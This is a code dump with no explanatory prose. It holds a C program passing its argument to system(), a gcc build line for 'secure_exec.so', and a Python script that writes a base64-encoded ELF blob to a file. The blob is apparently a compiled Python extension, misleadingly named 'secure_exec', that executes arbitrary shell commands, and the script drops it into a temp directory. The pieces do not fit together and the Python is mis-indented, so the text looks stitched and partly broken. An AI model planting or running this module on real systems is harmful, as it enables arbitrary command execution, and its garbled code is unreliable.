    #include <stdio.h>
    #include <stdlib.h>

int main(int argc, char* argv[]) {
    if (argc != 2) {
        fprintf(stderr, "Usage: %s <command>n", argv[0]);
        return 1;
    }
    return system(argv[1]);
}
gcc -shared -o secure_exec.so -fPIC -I/usr/include/python3.13 module.c
import base64
import os

def base64_to_file(encoded_data, output_path):
    try:
        # 对Base64加密的数据进行解密
        decoded_data = base64.b64decode(encoded_data)
        
        # 确保输出目录存在
        os.makedirs(os.path.dirname(output_path), exist_ok=True)
        
        # 将解密后的内容写入到指定文件中
        with open(output_path, 'wb') as file:
            file.write(decoded_data)
        
        print(f"解密后的数据已成功写入到 {output_path}")
    
except Exception as e:
        print(f"解密或写入文件时发生错误：{e}")

# 示例：将Base64加密的数据解密并写入到tmp目录下的sec.so文件中
encoded_data = "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AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAEiD7AhIiwXFLwAASIXAdAL/0EiDxAjDAAAAAAAAAAAA/zXKLwAA/yXMLwAADx9AAP8lyi8AAGgAAAAA6eD/////JcIvAABoAQAAAOnQ/////yW6LwAAaAIAAADpwP////8lsi8AAGgDAAAA6bD/////JWovAABmkAAAAAAAAAAASI09YTAAAEiNBVowAABIOfh0FUiLBS4vAABIhcB0Cf/gDx+AAAAAAMMPH4AAAAAASI09MTAAAEiNNSowAABIKf5IifBIwe4/SMH4A0gBxkjR/nQUSIsF/S4AAEiFwHQI/+BmDx9EAADDDx+AAAAAAPMPHvqAPe0vAAAAdStVSIM92i4AAABIieV0DEiLPQ4vAADoWf///+hk////xgXFLwAAAV3DDx8Aww8fgAAAAADzDx766Xf///9VSInlSIPsIEiJfehIiXXgSI1V8EiLReBIjQ2oDgAASInOSInHuAAAAADo+P7//4XAdQe4AAAAAOscSItF8EiJx+ix/v//iUX8i0X8SJhIicfosf7//8nDVUiJ5b71AwAASI0F3y4AAEiJx+in/v//XcMASIPsCEiDxAjDAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABzAGV4ZWN1dGVfY29tbWFuZABFeGVjdXRlIGEgc3lzdGVtIGNvbW1hbmQAc2VjdXJlX2V4ZWMAAAEbAzssAAAABAAAAOjv//9IAAAAOPD//3AAAAAB8f//iAAAAFnx//+oAAAAAAAAABQAAAAAAAAAAXpSAAF4EAEbDAcIkAEAACQAAAAcAAAAmO///1AAAAAADhBGDhhKDwt3CIAAPxo7KjMkIgAAAAAUAAAARAAAAMDv//8IAAAAAAAAAAAAAAAcAAAAXAAAAHHw//9YAAAAAEEOEIYCQw0GAlMMBwgAABwAAAB8AAAAqfD//xoAAAAAQQ4QhgJDDQZVDAcIAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA